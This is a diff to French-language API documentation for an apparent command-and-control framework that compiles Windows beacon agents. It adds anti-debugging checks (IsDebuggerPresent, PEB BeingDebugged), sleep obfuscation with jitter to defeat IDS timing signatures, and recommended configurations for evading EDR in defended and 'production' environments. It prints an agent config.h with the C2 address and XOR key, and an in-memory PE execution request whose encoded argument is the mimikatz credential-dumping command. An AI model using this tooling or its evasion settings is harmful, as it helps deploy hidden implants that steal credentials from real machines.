@@ -241,19 +241,60 @@ Génère un nouvel agent compilé.
     "xor_key": "mysupersecretkey",
     "beacon_interval": 60,
     "anti_vm": false,
+    "anti_debug": true,
+    "sleep_obfuscation": true,
+    "jitter_percent": 0.15,
     "headers": [["Accept", "application/json"]]
   }
 }
 ```
+
+**Paramètres disponibles** :
+
+| Paramètre | Type | Défaut | Description |
+|-----------|------|--------|-------------|
+| `host` | string | - | Adresse C2 |
+| `port` | int | - | Port listener |
+| `uri_path` | string | - | Chemin beacon |
+| `user_agent` | string | - | User-Agent HTTP |
+| `xor_key` | string | - | Clé chiffrement |
+| `beacon_interval` | int | 60 | Intervalle beacon (sec) |
+| `anti_vm` | boolean | false | Détection virtualisation |
+| `anti_debug` | boolean | false | ⭐ Détection débogage |
+| `sleep_obfuscation` | boolean | false | ⭐ Obfuscation sleep |
+| `jitter_percent` | float | 0.2 | ⭐ Variation beacon (±%) |
+| `headers` | array | [] | Headers HTTP custom |
 
 **Réponse** : Fichier binaire (application/octet-stream)
 
 ```mermaid
 flowchart LR
     A[Requête génération] --> B[Validation listener]
-    B --> C[Génération config.h]
-    C --> D[Compilation C++<br/>mingw32-g++]
-    D --> E[Retour binaire]
+    B --> C[Génération config.h<br/>avec params agents]
+    C --> D[Injection anti-debug &<br/>sleep obfuscation]
+    D --> E[Compilation C++<br/>mingw32-g++]
+    E --> F[Retour binaire]
+```
+
+**Implémentation config.h** :
+
+```cpp
+// Network
+constexpr char XOR_SERVERS[] = "192.168.1.10";
+constexpr int XOR_PORT = 80;
+constexpr char RESULTS_PATH[] = "/api/update";
+constexpr char USER_AGENT[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
+constexpr char XOR_KEY[] = "mysupersecretkey";
+constexpr int BEACON_INTERVAL = 60;
+
+// Detection
+constexpr bool ANTI_VM_ENABLED = false;
+constexpr bool ANTI_DEBUG_ENABLED = true;      // ⭐ Nouveau
+constexpr bool SLEEP_OBFUSCATION_ENABLED = true; // ⭐ Nouveau
+constexpr float JITTER_PERCENT = 0.15f;        // ⭐ Nouveau
+
+// Headers
+constexpr char HEADER[] = "Accept: application/json";
 ```
 
 **Note** : L'agent n'est pas enregistré dans la base de données à la génération. Il sera automatiquement enregistré lors de son premier check-in (beacon).
@@ -624,6 +665,117 @@ Récupération des données PE pour exécution en mémoire.
 {
   "content": "TVqQAAMAAAAEAAAA...",
   "args": "c2VrdXJsc2E6OmxvZ29ucGFzc3dvcmRz"
+}
+```
+
+---
+
+## Fonctionnalités Anti-Détection (Nouveautés)
+
+Le backend supporte la génération d'agents avec des protections avancées contre la détection et l'analyse.
+
+### Anti-Debug
+
+Lors de la génération avec `"anti_debug": true`, le serveur injecte dans `config.h` :
+
+```cpp
+constexpr bool ANTI_DEBUG_ENABLED = true;
+```
+
+**Implémentation agent** :
+- Méthode 1 : `IsDebuggerPresent()` - API kernel Windows
+- Méthode 2 : Vérification PEB (Process Environment Block)
+  - x86_64 : `__readgsqword(0x60)` → `peb->BeingDebugged`
+  - x86 : `__readfsdword(0x30)` → `peb->BeingDebugged`
+
+**Comportement** :
+- L'agent vérifie à son démarrage
+- S'il détecte un debugger, il termine silencieusement
+- Double protection : difficile de contourner les deux méthodes
+
+**Intérêt éducatif** :
+- Démonstration des structures internes Windows
+- Illustration des techniques anti-forensics
+- Compréhension des protections malware
+
+---
+
+### Sleep Obfuscation
+
+Lors de la génération avec `"sleep_obfuscation": true`, le serveur injecte dans `config.h` :
+
+```cpp
+constexpr bool SLEEP_OBFUSCATION_ENABLED = true;
+constexpr float JITTER_PERCENT = 0.15f;
+```
+
+**Implémentation agent** :
+- Remplace `Sleep()` classique par `CreateThreadpoolTimer()`
+- Ajoute une variation aléatoire (jitter) au beacon interval
+- Optionnellement chiffre les régions mémoire sensibles (XOR 256-bit)
+
+**Avantages** :
+
+| Aspect | Sans obfuscation | Avec obfuscation |
+|--------|-----------------|------------------|
+| Détection trafic | Triviale (timing fixe) | Difficile (timing variable) |
+| Breakpoint | Sleep() détectable | Thread pool non détectable |
+| Memory dump | RAM lisible pendant sleep | RAM chiffrée pendant sleep |
+| Signature IDS | Possible (pattern timing) | Impossible (aléatoire) |
+
+**Configuration** :
+
+```json
+{
+  "config": {
+    "beacon_interval": 300,
+    "sleep_obfuscation": true,
+    "jitter_percent": 0.15
+  }
+}
+```
+
+**Résultat** :
+- Beacon interval : 300 ± (300 × 0.15) = 255-345 secondes
+- Chaque cycle varie aléatoirement
+- Trafic réseau moins prévisible pour les IDS/IPS
+
+**Cas d'usage** :
+- Evasion de détection de trafic réseau
+- Démonstration des techniques d'obfuscation
+- Simulation d'environnements défendus
+
+---
+
+### Configurations Recommandées
+
+**Pour POC/Apprentissage** :
+```json
+{
+  "anti_debug": false,
+  "sleep_obfuscation": false,
+  "jitter_percent": 0.0,
+  "beacon_interval": 5
+}
+```
+
+**Pour Environnement Défendu (EDR/IDS/IPS)** :
+```json
+{
+  "anti_debug": true,
+  "sleep_obfuscation": true,
+  "jitter_percent": 0.25,
+  "beacon_interval": 600
+}
+```
+
+**Équilibre Production** :
+```json
+{
+  "anti_debug": true,
+  "sleep_obfuscation": true,
+  "jitter_percent": 0.15,
+  "beacon_interval": 300
 }
 ```
 
